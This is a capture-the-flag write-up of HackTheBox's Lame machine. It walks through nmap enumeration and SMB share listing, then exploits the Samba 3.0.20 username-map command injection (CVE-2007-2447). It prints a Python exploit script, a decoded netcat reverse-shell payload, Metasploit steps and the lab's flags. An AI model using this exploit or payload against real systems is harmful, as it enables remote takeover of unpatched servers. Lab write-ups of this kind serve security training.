---
layout: post
title:  "HackTheBox: Lame"
description: Write up and complete walkthrough of HackTheBox's Lame
---


**Overview**

Lame is a (2/10) linux box that was exploitable by using a vulnerability found in the Samba implementation of the SMB Protocol used by windows to share files and ressources across a network. The vulnerability allowed for injection of arbitrairy commands through the unfiltered username field during the authentication phase of the connection to the service.  
	
# Enumeration
	
**Nmap scan**

```bash
# Nmap 7.80 scan initiated Fri Jun 25 18:04:38 2021 as: nmap -v -sC -sV -oA nmap/lame 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up (0.098s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h05m12s, deviation: 2h49m44s, median: 5m10s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2021-06-25T18:10:11-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 25 18:05:37 2021 -- 1 IP address (1 host up) scanned in 59.27 seconds

```

We can right away that three ports are interesting here:
- Port 139 is running Samba
- Port 445 is running Samba v3.0.20
- Port 21 is running FTP and allows anonymous auth
	
# Exploiting Anonymous FTP
	
We can connect to port 21 by using any credentials as anonymous FTP is authorized.

```terminal
~/htb/lame$ ftp 10.10.10.3                                                                                                                                                                              
Connected to 10.10.10.3.                                                                                                                                                                                          
220 (vsFTPd 2.3.4)                                                                                                                                                                                                
Name (10.10.10.3:kali): ftp                                                                                                                                                                                       
331 Please specify the password.                                                                                                                                                                                  
Password:                                                                                                                                                                                                         
230 Login successful.                                                                                                                                                                                             
Remote system type is UNIX.                                                                                                                                                                                       
Using binary mode to transfer files.                                                                                                                                                                              
ftp> ls -la                                                                                                                                                                                                       
200 PORT command successful. Consider using PASV.                                                                                                                                                                 
150 Here comes the directory listing.                                                                                                                                                                             
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .                                                                                                                                                         
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..                                                                                                                                                        
226 Directory send OK.
```

The directory seems to be empty and thus is not really relevant. Let's look somewhere else.
	
# Looking through port 139 and port 445

Port 139 and 445 are open and used by the Samba service, an open-source dialect and implementation of the SMB Protocol (Server Message Block) that is often used on windows machines to allow communication over a network for sharing access to things like files, printers, serial ports, etc.

Port 139 is used to communicate over NetBIOS, [a transport layer protocol designed to use in windows operating systems over a network](https://www.upguard.com/blog/smb-port). 

Port 445 is used by newer versions of SMB (after Windows 2000) on top of a TCP stack, allowing SMB to communicate over the Internet. This also means you can use IP addresses in order to use SMB like file sharing.

We can start by looking through the ports to see if we can find anything:

```terminal
kali@kali:~/htb/lame$ sudo smbmap -H 10.10.10.3
[sudo] password for kali: 
[+] IP: 10.10.10.3:445  Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))

```

It would seem like the `tmp` disk allows read and write operations.

Let's try to connect to it:

```terminal
kali@kali:~/htb/lame$ smbclient \\\\10.10.10.3\\tmp
Enter WORKGROUP\kali's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun 27 14:47:38 2021
  ..                                 DR        0  Sat Oct 31 02:33:58 2020
  .ICE-unix                          DH        0  Sun Jun 27 14:31:00 2021
  vmware-root                        DR        0  Sun Jun 27 14:31:22 2021
  .X11-unix                          DH        0  Sun Jun 27 14:31:25 2021
  .X0-lock                           HR       11  Sun Jun 27 14:31:25 2021
  5563.jsvc_up                        R        0  Sun Jun 27 14:32:03 2021
  vgauthsvclog.txt.0                  R     1600  Sun Jun 27 14:30:58 2021

                7282168 blocks of size 1024. 5386560 blocks available
smb: \> 

```

We can connect to it through anonymous login. However, this is pretty limited since we can't exactly read anything or dig further.

Off the enumeration, we were able to determine the version that is ran by Samba on port 445: v3.0.20.

We can begin to look through exploitdb for a possible vulnerabilty:

```bash
$ searchsploit samba
```

This will give us a list of exploits from the *exploitdb* database.

If we grep for our version, we can get this list:

```sh
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) -> unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow -> linux/remote/7701.txt
```

The remote heap overflow concerns versions strictly below 3.0.20, therefore it's not applicable.

However, it would seem like there is a vulnerability with the username map script that allows command execution; we can try to exploit that.

In this version of the Samba SMB implementation, there was a vulnerability involving the username input during the authentification process that allowed users to input shell characters without it being filtered. This thus allowed for arbitrairy command execution. ([CVE-2007-2447](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-2447))

This is great, because this exploit doesn't require us to have a user's credentials and enter the system before trying to exploit it. We just need to have a valid host address that is running a version of the Samba dialect, as we do.

This exploit has already been implemented, but we can take a look at one of the implementations and understand from it:

```python
#!/usr/bin/python3     
# Slightly configured python script of the SMB Samba username exploit to allow for different listener host and port, as well as remote port.    
# Also converted to python3    
# Original here: https://gist.githubusercontent.com/joenorton8014/19aaa00e0088738fc429cff2669b9851/raw/6e1ae37e0061be103fd733b16266d26379a7f4ba/samba-usermap-exploit.py    
    
from smb.SMBConnection import SMBConnection    
import random, string    
from smb import smb_structs    
smb_structs.SUPPORT_SMB2 = False    
import sys    
    
# Based off this Metasploit module - https://www.exploit-db.com/exploits/16320/     
    
# Use the commandline argument as the target:     
if len(sys.argv) < 5:    
    print("\nUsage: " + sys.argv[0] + " <RHOST>\n" + "<RPORT>" + "<LHOST>" + "<LPORT>")    
    sys.exit()    
    
LHOST = "\\x" + "\\x".join("{:02x}".format(ord(c)) for c in sys.argv[3])    
LPORT = "\\x" + "\\x".join("{:02x}".format(ord(c)) for c in sys.argv[4])    
    
buf =  ""    
buf += "\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b"    
buf += "\x62\x67\x61\x66\x3b\x20\x6e\x63\x20"    
buf += str(LHOST) + str(LPORT) + "\x20\x30\x3c"    
buf += "\x2f\x74\x6d\x70\x2f\x6b\x62\x67\x61\x66\x20\x7c\x20"    
buf += "\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d\x70"    
buf += "\x2f\x6b\x62\x67\x61\x66\x20\x32\x3e\x26\x31\x3b\x20"    
buf += "\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x6b\x62\x67\x61\x66"    
buf += "\x20"    
    
    
username = "/=`nohup " + buf + "`"    
password = ""    
conn = SMBConnection(username, password, "SOMEBODYHACKINGYOU", "METASPLOITABLE", use_ntlm_v2 = False)    
assert conn.connect(sys.argv[1], int(sys.argv[2]))      
```

This code injects the hexstring into the username and produces a reverse shell.

This is the decoded injected payload that produces the reverse shell.
```bash
mkfifo /tmp/kbgaf; nc <LHOST> <LPORT> 0</tmp/kbgaf | /bin/sh >/tmp/kbgaf 2>&1; rm /tmp/kbgaf 
```

We can also omit the python script and directly use the exploit from the msfconsole:

```msf
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   445              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  XX.XX.XX.XX      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

We must set the options accordingly to allow the reverse shell to connect back to our host machine. set LHOST to the ip address provided by the ovpn instance under the `tun0` section found by running `ip addr`.

Then set the `RHOST` option to the ip address of the target machine, in this case `10.10.10.3`. 

```msf
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 10.10.14.16:4444 
[*] Command shell session 2 opened (XX.XX.XX.XX:4444 -> 10.10.10.3:35875) at 2021-06-27 18:37:31 -0400
```

Running `exploit` will give us a reverse shell.

For a better shell we can use python's pty module:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This will give us command history, tab-completion as well as a better prompt!
	
# Finding the flags

So we finally have a shell, let's try to dig in and find the flags.

### System flag
<hr>

It's not hard to find the system flag since we're already root.

```terminal
root@lame:/# ls -la
ls -la
total 101
drwxr-xr-x  21 root root  4096 Oct 31  2020 .
drwxr-xr-x  21 root root  4096 Oct 31  2020 ..
drwxr-xr-x   2 root root  4096 Oct 31  2020 bin
drwxr-xr-x   4 root root  1024 Nov  3  2020 boot
lrwxrwxrwx   1 root root    11 Apr 28  2010 cdrom -> media/cdrom
drwxr-xr-x  13 root root 13540 Jun 27 14:31 dev
drwxr-xr-x  96 root root  4096 Jun 27 14:31 etc
drwxr-xr-x   6 root root  4096 Mar 14  2017 home
drwxr-xr-x   2 root root  4096 Mar 16  2010 initrd
lrwxrwxrwx   1 root root    32 Oct 31  2020 initrd.img -> boot/initrd.img-2.6.24-32-server
lrwxrwxrwx   1 root root    32 Oct 31  2020 initrd.img.old -> boot/initrd.img-2.6.24-16-server
drwxr-xr-x  13 root root  4096 Oct 31  2020 lib
drwx------   2 root root 16384 Mar 16  2010 lost+found
drwxr-xr-x   4 root root  4096 Mar 16  2010 media
drwxr-xr-x   3 root root  4096 Apr 28  2010 mnt
-rw-------   1 root root 17357 Jun 27 14:31 nohup.out
drwxr-xr-x   2 root root  4096 Mar 16  2010 opt
dr-xr-xr-x 114 root root     0 Jun 27 14:30 proc
drwxr-xr-x  13 root root  4096 Jun 27 14:31 root
drwxr-xr-x   2 root root  4096 Nov  3  2020 sbin
drwxr-xr-x   2 root root  4096 Mar 16  2010 srv
drwxr-xr-x  12 root root     0 Jun 27 14:30 sys
drwxrwxrwt   5 root root  4096 Jun 27 18:42 tmp
drwxr-xr-x  12 root root  4096 Apr 28  2010 usr
drwxr-xr-x  15 root root  4096 May 20  2012 var
lrwxrwxrwx   1 root root    29 Oct 31  2020 vmlinuz -> boot/vmlinuz-2.6.24-32-server
lrwxrwxrwx   1 root root    29 Oct 31  2020 vmlinuz.old -> boot/vmlinuz-2.6.24-16-server
```

```terminal
root@lame:/# cd root
cd root
lroot@lame:/root# s
ls
Desktop  reset_logs.sh  root.txt  vnc.log 
```

```terminal
root@lame:/root# cat root.txt
cat root.txt
503d4f595a7bb385d1a4654773e5d8b5
```

We have the first flag: `503d4f595a7bb385d1a4654773e5d8b5`
<br>

### The user flag
<hr>

For this one, we're looking for the user's flag. Let's list the users on the machine:

```terminal
root@lame:/root# cat root.txt
cat root.txt
503d4f595a7bb385d1a4654773e5d8b5
root@lame:/root# cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false
makis:x:1003:1003::/home/makis:/bin/sh
```
The only user that is relevant here is `makis`:

```terminal
root@lame# cd /home/makis
cd /home/makis
root@lame:/home/makis# ls -la
ls -la
total 28
drwxr-xr-x 2 makis makis 4096 Mar 14  2017 .
drwxr-xr-x 6 root  root  4096 Mar 14  2017 ..
-rw------- 1 makis makis 1107 Mar 14  2017 .bash_history
-rw-r--r-- 1 makis makis  220 Mar 14  2017 .bash_logout
-rw-r--r-- 1 makis makis 2928 Mar 14  2017 .bashrc
-rw-r--r-- 1 makis makis  586 Mar 14  2017 .profile
-rw-r--r-- 1 makis makis    0 Mar 14  2017 .sudo_as_admin_successful
-rw-r--r-- 1 makis makis   33 Jun 27 14:31 user.txt
root@lame:/home/makis# cat user.txt
cat user.txt
4ec0ef68ae8c30c191c40bc673c7759d
```

And we have our second flag: `4ec0ef68ae8c30c191c40bc673c7759d`